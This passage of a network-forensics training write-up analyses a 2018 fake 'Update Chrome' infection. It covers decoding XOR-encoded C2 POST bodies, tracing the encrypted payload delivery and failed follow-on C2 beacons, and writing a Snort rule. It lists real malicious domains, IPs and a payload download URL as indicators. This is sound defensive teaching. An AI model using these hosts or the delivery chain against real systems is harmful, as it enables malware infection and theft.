3. Replace step 2 with **XOR** — that key, **HEX**.
4. **URL Decode** (turns `%5C` into `\`, `%3A` into `:` …).

| Body | Key | Decoded (first characters are junk — ignore them) |
|---|---|---|
| `a=` (72 hex) | `5d` | `0=c8ae6d45&1=507&2=1530390526937&` |
| `b=` (2,642 hex) | `db` | see below |
| `c=` (254 hex) | `c8` | `0=507&1=C:\Users\LLOYD~1.MAX\AppData\Local\Temp\Chrome_72.3.22.exe&2=0&3=0&4=1&...&9=1530390529896&` |

Body `b=` decoded (process list shortened):

```text
0=507
&1=C:\Users\lloyd.maxwell\Downloads\Chrome_72.3.22.js
&2=AMD64
&3=CONSERVATOR-PC
&4=lloyd.maxwell
&5=6
&6=Windows_NT
&7=FABULOUSDUKES
&8=System manufacturer|
&9=System Product Name|
&10=031913 - 20130319;System Serial Number|
&11=Windows Defender|
&13=90:E2:BA:2D:C6:D6|
&14=Enhanced (101- or 102-key)|...
&16=1024x768|
&17=System Idle Process|System|smss.exe|...|explorer.exe|...|chrome.exe|chrome.exe|...|wscript.exe|mscorsvw.exe|...|WmiPrvSE.exe|
&18=2596
&20=1530390528027
```

**Reading:**

- **`a=`** — "hello": an ID (`c8ae6d45`), a number `507` (repeated in `b=` and `c=` — probably a campaign/build number) and the time in milliseconds (`1530390526937` = 20:28:46.937 UTC — the PC's clock agrees with the capture).
- **`b=`** — a **PC profile**: where the script was run from (**`Downloads\Chrome_72.3.22.js`** — proves the user ran the Dropbox file), CPU, **host name, user, domain**, hardware and BIOS strings, **antivirus product (`Windows Defender`)**, a MAC address, keyboard, mouse, screen size and the **full process list**. `wscript.exe` is in the list — the script engine is running. This lets the attacker decide whether the PC is a real corporate target or a sandbox (screen 1024x768, generic "System manufacturer" strings…).
- **Reply to `b=` = 349 KB.** The PC passed the check and was sent a payload.
- **`c=`** — a report back: the payload was saved as **`C:\Users\LLOYD~1.MAX\AppData\Local\Temp\Chrome_72.3.22.exe`** and run (`LLOYD~1.MAX` is the short 8.3 name of `lloyd.maxwell`). The reply is empty — nothing more to do.

!!! question "Question: why is the key different for each body?"
    The script picks a new one-byte key for each message (`5d`, `db`, `c8`); the first byte or two of each decoded body are probably how the server learns the key, which is why they look like junk. It does not matter for the analyst: **the crib finds the key every time**. What stays the same is the **form** — `a=`/`b=`/`c=` + hex + 1-byte XOR — and that form is what a detection should look for.

!!! question "Question: the MAC in `13=` (90:E2:BA:2D:C6:D6) is not the MAC in the capture (00:13:d4:1f:a2:5e)"
    `13=` is what the script read from Windows (a list ending in `|`, so possibly one of several adapters); the capture MAC is what was on the wire. A virtual or second adapter, or a re-written lab capture, can cause this. For the network the **on-wire MAC** is the fact; pass both to the host operator.

### 4-4. The 349 KB reply — the payload { #payload }

**Splunk** (Zeek treats every HTTP body as a file and hashes it):

```spl
index=zeek sourcetype=zeek:files pcap_case=20180630_SORTING_ALERTS tx_hosts="93.95.100.138"
| eval t=strftime(ts,"%H:%M:%S")
| table t tx_hosts rx_hosts mime_type seen_bytes md5 sha1
```

- `tx_hosts` = who sent the file, `rx_hosts` = who received it, `mime_type` = Zeek's guess from the content, `seen_bytes` = size.

```text
t         tx_hosts       rx_hosts      mime_type    seen_bytes  md5
20:28:47  93.95.100.138  172.16.2.169  text/plain   11866       0e8a4bb8758c4ca91a3ee52395617ef9
20:28:48  93.95.100.138  172.16.2.169  text/plain   348868      dd83bbcc7dd4184b352f9882c3fe8408
```

**Arkime:** the 348,868-byte reply is **hex text** again (`ca02a05b5aed8b82...`). So the real size of the data is half: **174,434 bytes**.

**Reading:**

- The payload is **not sent as an EXE** — no `MZ`, no `application/x-dosexec`, so a "find EXE downloads" search misses it. The script decodes it on the PC and writes `Chrome_72.3.22.exe` (body `c=`).
- The MD5 above is of the **encoded** reply. It will **not** match the `.exe` on disk — the host operator must hash the file in `%TEMP%`.

!!! note "Going further (optional) — it is an EXE inside"
    Single-byte XOR brute force on the decoded 174 KB gives nothing. But long runs of the same bytes repeat every **90 bytes** — the sign of a **repeating XOR key** over a file that has many zero bytes (a Windows EXE has lots). Taking the most common byte in each of the 90 positions as the key gives a file starting `MZ ... This program cannot be run in DOS mode`, a 32-bit Windows EXE. Recovering a long key is malware-analysis work, not ticket work; the network conclusion is the same: **an encrypted Windows EXE was delivered**. Do not hash a file you rebuilt this way into the ticket — get the real one from the host.

**Ticket entry:**

```text
[0041 261124, Sung] – Investigating HTTP POSTs from 172.16.2.169 to kimbrelelectric.com (WScript C2) – Found – Further Analysis Required
[0058 261124, Sung] – Decoding C2 POST bodies in CyberChef – Found
```

---

## Step 5 — After the payload: two C2 addresses that never answer { #followon }

**Goal:** a new program on the PC usually starts talking to **its own** server. Look for **new external destinations after 20:28:50** (the last POST), especially ones with **no DNS name**.

```spl
index=zeek sourcetype=zeek:conn pcap_case=20180630_SORTING_ALERTS id_orig_h=172.16.2.169 ts>1530390530
| where NOT cidrmatch("172.16.0.0/12", id_resp_h) AND NOT cidrmatch("224.0.0.0/4", id_resp_h)
| stats min(ts) as first max(ts) as last count values(conn_state) as states sum(orig_bytes) as sent sum(resp_bytes) as received by id_resp_h id_resp_p
| eval first=strftime(first,"%H:%M:%S"), last=strftime(last,"%H:%M:%S")
| sort first
```

- Line 1 `ts>1530390530` — only connections that **start after** 2018-06-30 20:28:50 UTC, written as epoch seconds. To get the number for any time, run `| makeresults | eval x=strptime("2018-06-30 20:28:50 +0000","%Y-%m-%d %H:%M:%S %z")` and read `x` (`makeresults` makes one empty row to calculate on; `%z` + `+0000` says the time is UTC).
- Line 2 `cidrmatch("172.16.0.0/12", id_resp_h)` — true if the IP is in that range. `NOT ... AND NOT ...` drops internal and multicast addresses.
- Line 3 — one row per destination IP and port: first/last time, number of connections, **`conn_state`** values, bytes each way.

```text
id_resp_h         id_resp_p  first     last      count  states  sent   received
46.105.131.66     443        20:29:00  20:59:05  10     REJ     0      0
107.170.231.118   4143       20:31:14  20:53:42  8      S0      0      0
... (CDN / ad servers from the open CNN tab, all SF with data — 20:29–20:36)
172.217.10.142    80         20:33:53  ...       1      SF      ...    ...      (redirector.gvt1.com — Chrome component update)
...
23.215.99.27      80         20:43:13  20:45:22  2      SF      454    1888     (crl.microsoft.com)
```

**What `conn_state` means here:**

| conn_state | What happened | Here |
|---|---|---|
| `SF` | Normal start and finish, data both ways | Web traffic |
| `REJ` | PC sent SYN, server answered **RST** — "nothing listening on that port" | 46.105.131.66:443 |
| `S0` | PC sent SYN, **no answer at all** | 107.170.231.118:4143 |

Did the PC look these IPs up in DNS?

```spl
index=zeek sourcetype=zeek:dns pcap_case=20180630_SORTING_ALERTS answers IN ("46.105.131.66","107.170.231.118")
| table ts query answers
```

**Result: no rows** — the addresses were **built into the program**.

The timing:

```spl
index=zeek sourcetype=zeek:conn pcap_case=20180630_SORTING_ALERTS id_resp_h IN ("46.105.131.66","107.170.231.118")
| sort ts
| delta ts as gap
| eval t=strftime(ts,"%H:%M:%S"), gap=round(gap,1)
| table t id_orig_p id_resp_h id_resp_p conn_state gap
```

- `delta ts as gap` — seconds since the previous row.

```text
t         id_orig_p  id_resp_h         id_resp_p  conn_state  gap
20:29:00  49447      46.105.131.66     443        REJ
20:29:01  49448      46.105.131.66     443        REJ         1.4
20:31:14  49471      107.170.231.118   4143       S0          132.4
20:31:35  49472      107.170.231.118   4143       S0          21.0
20:36:10  49491      46.105.131.66     443        REJ         275.0
20:36:11  49492      46.105.131.66     443        REJ         1.4
20:38:30  49493      107.170.231.118   4143       S0          138.4
20:38:51  49494      107.170.231.118   4143       S0          21.0
20:43:37  49503      46.105.131.66     443        REJ         286.0
20:43:38  49504      46.105.131.66     443        REJ         1.4
20:45:53  49506      107.170.231.118   4143       S0          134.4
20:46:14  49507      107.170.231.118   4143       S0          21.0
20:51:14  49508      46.105.131.66     443        REJ         300.0
20:51:15  49509      46.105.131.66     443        REJ         1.4
20:53:21  49510      107.170.231.118   4143       S0          125.4
20:53:42  49511      107.170.231.118   4143       S0          21.0
20:59:04  49513      46.105.131.66     443        REJ         322.1
20:59:05  49514      46.105.131.66     443        REJ         1.4
```

**Reading:**

- The first attempt is **10 seconds after the payload was saved** (20:28:50 → 20:29:00). Nothing in the browsing explains these two IPs.
- **Bare IPs, no DNS**, unusual port **4143**, and a fixed rhythm: IP 1 twice → ~2 min → IP 2 twice → ~5 min → repeat. Each round ≈ **7.5 minutes**, until the capture ends. That is a **program working through a C2 list**, not a person.
- **No connection ever succeeded**, so **no C2 data**, no commands, no further downloads. The servers were already down or blocked when this traffic was recorded.
- Hard-coded IP:port C2 on 443 and odd high ports, started by the payload of a fake-update infection, is how **Dridex** (banking trojan) behaved in 2018. Without a working session, a hash or a signature, this stays **"consistent with Dridex (unconfirmed)"**.

!!! question "Question: if nothing connected, is the PC still infected?"
    Yes. The network shows a program **on the PC** trying to reach its C2 every few minutes. The C2 being dead protects the PC only **today**: the malware may have more addresses, may get them later, or the servers may come back. The ticket says "infected, follow-on C2 not working". The host still needs cleaning and the user's passwords should be treated as exposed (banking trojans steal them).

!!! question "Question: what can the host operator look for?"
    From this traffic:

    - `C:\Users\lloyd.maxwell\Downloads\Chrome_72.3.22.js` and `C:\Users\lloyd.maxwell\AppData\Local\Temp\Chrome_72.3.22.exe` — collect and hash.
    - `wscript.exe` started from `explorer.exe` around 20:28:46 UTC (Event 4688 / Sysmon 1).
    - What the EXE left behind (it may have moved itself) — Run keys, scheduled tasks, new DLLs in `%APPDATA%`.
    - Chrome history for `www.stmarybahrain.com` and the fake page at 20:27:53–20:27:57.

**Ticket entry:**

```text
[0109 261124, Sung] – Looking for new external connections by 172.16.2.169 after the payload download – Found
```

---

## Step 6 — One simple Snort rule { #snort }

The most specific thing the network shows is the C2 host. One plain content match:

```text
alert tcp $HOME_NET any -> $EXTERNAL_NET 80 (msg:"SocGholish C2 kimbrelelectric.com - Sung"; content:"kimbrelelectric.com"; nocase; sid:1000041; rev:1;)
```

- `alert tcp $HOME_NET any -> $EXTERNAL_NET 80` — TCP from any inside port to port 80 outside (HTTP).
- `msg:"..."` — the alert text, author at the end.
- `content:"kimbrelelectric.com"; nocase;` — the packet contains this text, upper or lower case. It is in the `Host:` header of every POST.
- `sid:1000041; rev:1;` — own rule number (1000000+) and version.

**Expected: 3 alerts** — the three POST packets on port 49440. DNS lookups for the name are UDP, so this TCP rule does not fire on them.

**Test it** (full beginner's steps: [Night Dew, second pass — 6-3](night-dew-arkime-splunk-netlogon-bruteforce.md#snort-test)):

```bash
sudo snort -T -c /etc/snort/snort.conf 2>&1 | tail -5
snort-test 20180630_SORTING_ALERTS
```

- `-T` — syntax check only. Look for `Snort successfully validated the configuration!`.
- `snort-test <case>` — pcapbox helper: runs the rules on `/data/pcap/<case>.pcap` and counts alerts per rule.

```text
     3 [1:1000041:1] SocGholish C2 kimbrelelectric.com - Sung
```

By hand, with times:

```bash
sudo snort -c /etc/snort/snort.conf -r /data/pcap/20180630_SORTING_ALERTS.pcap -A console -q -k none -U -y -l /tmp/snortlog
```

```text
06/30/18-20:28:47.389809  [**] [1:1000041:1] SocGholish C2 kimbrelelectric.com - Sung [**] [Priority: 0] {TCP} 172.16.2.169:49440 -> 93.95.100.138:80
06/30/18-20:28:48.186564  [**] [1:1000041:1] SocGholish C2 kimbrelelectric.com - Sung [**] [Priority: 0] {TCP} 172.16.2.169:49440 -> 93.95.100.138:80
06/30/18-20:28:50.047505  [**] [1:1000041:1] SocGholish C2 kimbrelelectric.com - Sung [**] [Priority: 0] {TCP} 172.16.2.169:49440 -> 93.95.100.138:80
```

Same times and port as Zeek's `http.log` — tools agree.

!!! note "A domain rule is the simplest, not the strongest"
    The attacker can change the domain tomorrow. Stronger ideas for later (not needed for this ticket): a POST to `/blank.gif` with `a=`/`b=`/`c=` and only hex after it; an `Age:` header in a **request**; the `MSIE 7.0` + `UA-CPU` User-Agent to a domain never seen before.

---

## Timeline (2018-06-30, UTC) { #timeline }

| Time | Event |
|---|---|
| 20:27:15 | Capture starts |
| 20:27:17–18 | CONSERVATOR-PC and **lloyd.maxwell** log on (Kerberos) |
| 20:27:52 | `www.cnn.com` opened (noise — ads and CDNs follow) |
| 20:27:53 | `www.stmarybahrain[.]com/new/` opened (no Referer) — **hacked site** |
| 20:27:54 | Site scripts load with injected code (7 `.js` files) |
| 20:27:55–56 | `track.positiverefreshment[.]org/s_code.js` ×3 — fingerprint, TDS passes the PC |
| 20:27:57 | Fake **"Update Chrome"** page from `lw2e.sineadhollywoodnutt[.]com` |
| 20:28:00–01 | Auto-download from Dropbox: `Chrome_72.3.22.js` (HTTPS) |
| 20:28:46 | DNS `bb17eb22.login3.kimbrelelectric[.]com` — **user runs the .js (wscript.exe)** |
| 20:28:47 | POST `a=` — hello |
| 20:28:48 | POST `b=` — PC profile; reply **349 KB encrypted payload** |
| 20:28:50 | POST `c=` — payload saved and run as `%TEMP%\Chrome_72.3.22.exe` |
| 20:29:00 | First follow-on C2 attempt 46.105.131.66:443 (refused) |
| 20:31:14 | First attempt 107.170.231.118:4143 (no answer) |
| 20:29–20:59 | Attempts repeat every ~7.5 min — never connect |
| 20:33–20:35 | Chrome component update via BITS (normal) |
| 20:59:06 | Capture ends; PC still trying |

---

## IOCs { #iocs }

| Type | Value | Note |
|---|---|---|
| Domain / IP | `www.stmarybahrain[.]com` — 66.226.144.232 | Hacked site; script injected into 7 `.js` files under `/new/` |
| Domain / IP | `track.positiverefreshment[.]org` — 185.244.149.74 | TDS, `/s_code.js?cid=220` |
| Domain / IP | `lw2e.sineadhollywoodnutt[.]com` — 93.95.100.178 | Fake "Update Chrome" page, `/topics/index.php`, `/chromefiles/` |
| URL | `hxxps://www.dropbox[.]com/s/fvl9rd86cmdilns/Chrome_72.3.22.js?dl=1` | Download link (Dropbox abused) |
| Domain / IP | `bb17eb22.login3.kimbrelelectric[.]com` — 93.95.100.138 | WScript C2, POST `/blank.gif`, payload delivery |
| HTTP header | `Age: 464b8967d47e14d7` in a request | Victim/session ID sent by the script |
| IP:port | 46.105.131.66:443, 107.170.231.118:4143 | Follow-on C2 attempts (no DNS) |
| File | `C:\Users\<user>\Downloads\Chrome_72.3.22.js` | Fake update script (hash: from host) |
| File | `C:\Users\<user>\AppData\Local\Temp\Chrome_72.3.22.exe` | Payload (hash: from host) |
| MD5 | `dd83bbcc7dd4184b352f9882c3fe8408` | 348,868-byte **encoded** C2 reply as seen on the wire — not the EXE |

---

## Incident ticket { #ticket }

Key findings only, short sentences, simple English. Operator name, operator log times and ticket links are placeholders to replace.

[:material-download: Download the ticket as a txt file](files/180630_CONSERVATOR-PC_ticket.txt){ .md-button }

```text
--8<-- "docs/blueteam/investigations/files/180630_CONSERVATOR-PC_ticket.txt"
```

Before sending: replace the operator log times and name with your own, and add the `ingest.log` SHA256 if your team records it.

---

## Copy-ready queries { #query-sheet }

Replace `<case>` with your case name. Drop `tags`/`pcap_case` on a live network.

**Splunk (Zeek)**

```spl
index=zeek sourcetype=zeek:conn | stats count by pcap_case
index=zeek sourcetype=zeek:conn pcap_case=<case> | stats min(ts) as first max(ts) as last count as sessions | eval first=strftime(first,"%Y-%m-%d %H:%M:%S"), last=strftime(last,"%Y-%m-%d %H:%M:%S")
index=zeek sourcetype=zeek:conn pcap_case=<case> | stats count as sessions dc(id_resp_h) as destinations sum(orig_bytes) as sent sum(resp_bytes) as received by id_orig_h | sort - sessions
index=zeek sourcetype=zeek:kerberos pcap_case=<case> | eval t=strftime(ts,"%H:%M:%S") | stats min(t) as first count by request_type client service success | sort first
index=zeek sourcetype=zeek:dns pcap_case=<case> qtype_name=SOA | eval t=strftime(ts,"%H:%M:%S") | table t id_orig_h query qtype_name answers
index=zeek sourcetype=zeek:http pcap_case=<case> | eval t=strftime(ts,"%H:%M:%S") | stats count min(t) as first values(method) as methods values(user_agent) as user_agents by host | sort first
index=zeek sourcetype=zeek:http pcap_case=<case> host IN ("<host1>","<host2>") | eval t=strftime(ts,"%H:%M:%S.%3N") | dedup host uri | sort ts | table t host uri referrer status_code resp_mime_types response_body_len
index=zeek sourcetype=zeek:http pcap_case=<case> | eval t=strftime(ts,"%H:%M:%S") | stats count min(t) as first values(host) as hosts by user_agent | sort first
index=zeek sourcetype=zeek:http pcap_case=<case> host="<c2 host>" | eval t=strftime(ts,"%H:%M:%S.%3N") | table t id_orig_p id_resp_h id_resp_p method uri status_code request_body_len response_body_len resp_mime_types
index=zeek sourcetype=zeek:ssl pcap_case=<case> server_name="*dropbox*" | eval t=strftime(ts,"%H:%M:%S.%3N") | table t id_resp_h id_resp_p server_name version established
index=zeek sourcetype=zeek:files pcap_case=<case> tx_hosts="<server ip>" | eval t=strftime(ts,"%H:%M:%S") | table t tx_hosts rx_hosts mime_type seen_bytes md5 sha1
index=zeek sourcetype=zeek:conn pcap_case=<case> id_orig_h=<host ip> ts><epoch> | where NOT cidrmatch("172.16.0.0/12", id_resp_h) AND NOT cidrmatch("224.0.0.0/4", id_resp_h) | stats min(ts) as first max(ts) as last count values(conn_state) as states sum(orig_bytes) as sent sum(resp_bytes) as received by id_resp_h id_resp_p | eval first=strftime(first,"%H:%M:%S"), last=strftime(last,"%H:%M:%S") | sort first
index=zeek sourcetype=zeek:dns pcap_case=<case> answers IN ("<ip1>","<ip2>") | table ts query answers
index=zeek sourcetype=zeek:conn pcap_case=<case> id_resp_h IN ("<ip1>","<ip2>") | sort ts | delta ts as gap | eval t=strftime(ts,"%H:%M:%S"), gap=round(gap,1) | table t id_orig_p id_resp_h id_resp_p conn_state gap
```

**Arkime**

```text
tags == <case>
tags == <case> && ip.src == 172.16.2.169 && port.dst == 138
tags == <case> && host.http == www.stmarybahrain.com && http.uri == *.js*
tags == <case> && host.http == track.positiverefreshment.org
tags == <case> && host.http == lw2e.sineadhollywoodnutt.com && http.uri == *index.php*
tags == <case> && host.http == bb17eb22.login3.kimbrelelectric.com
tags == <case> && ip.dst == [46.105.131.66, 107.170.231.118]
```

**CyberChef**

```text
Hidden JS strings:   Find / Replace (Regex (.)(.) → $2, Global)  →  Reverse (Character)
C2 POST bodies:      From Hex  →  XOR Brute Force (Key length 1, Crib &1=)  →  XOR (Key <hex>)  →  URL Decode
```

---

## Lessons { #lessons }

1. **Busy browsing hides a short attack.** 185 destinations; the infection is four hosts in one minute. Group HTTP by host and rule out the known-good (BITS, CryptoAPI, CDNs) first.
2. **The Referer is the chain.** Every malicious request pointed back to `/new/` on the church site — proof that the site, not another tab, started it.
3. **A new User-Agent = a new program.** Chrome → `MSIE 7.0` + `UA-CPU` 46 seconds after a download means the user ran the file.
4. **Splunk for "who/when/how big", Arkime for "what exactly".** Zeek gave sizes and hashes; the redirect URLs, the download link and the profile data were only in the bodies.
5. **Simple tricks, simple recipes.** "Every second character, reversed" and "hex + 1-byte XOR" fall to two- and four-step CyberChef recipes. A crib from the **format** (`&1=` in a form post) found every key.
6. **Encoded payloads skip EXE searches.** 349 KB of hex text labelled `text/plain` was the payload. Judge by size and context, not by MIME type.
7. **Failed connections are evidence.** `REJ` and `S0` with no bytes, to hard-coded IPs, on a timer, right after a payload — that is an infection with a dead C2, not a clean PC.
8. **Write what traffic cannot show, and where to find it.** The `.js` and `.exe` content and hashes, persistence and the real malware family all come from the host.

## References { #references }

- [Night Dew, second pass — pcapbox, Arkime + Splunk, Snort test guide](night-dew-arkime-splunk-netlogon-bruteforce.md)
- [Phishing red herring to exploit-kit drive-by — another hacked-site chain](phishing-red-herring-ek-driveby-ursnif-c2.md)
- [SPL cheat sheet](../splunk/spl-cheatsheet.md) · [Arkime search syntax](../../network/arkime/search-syntax.md)
- [Zeek logs](../../network/zeek/index.md) · [conn.log](../../network/zeek/conn-log.md) · [files.log](../../network/zeek/files-log.md) · [ssl & x509](../../network/zeek/ssl-x509.md)
- [Beaconing & C2](../../network/beaconing-c2.md) · [Playbook: compromised workstation](../playbooks/compromised-workstation.md)
- Original exercise: [malware-traffic-analysis.net — 2018-06-30 Sorting through the alerts](https://malware-traffic-analysis.net/2018/06/30/index.html)
